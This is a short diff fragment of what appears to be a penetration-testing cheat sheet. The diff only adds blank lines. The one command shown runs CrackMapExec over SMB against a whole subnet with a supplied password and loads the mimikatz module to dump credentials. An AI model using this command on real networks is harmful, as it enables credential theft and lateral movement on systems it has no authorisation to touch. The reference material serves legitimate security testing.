@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:25:48.419627+00:00'
 ```bash
 root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
 ```
+
+
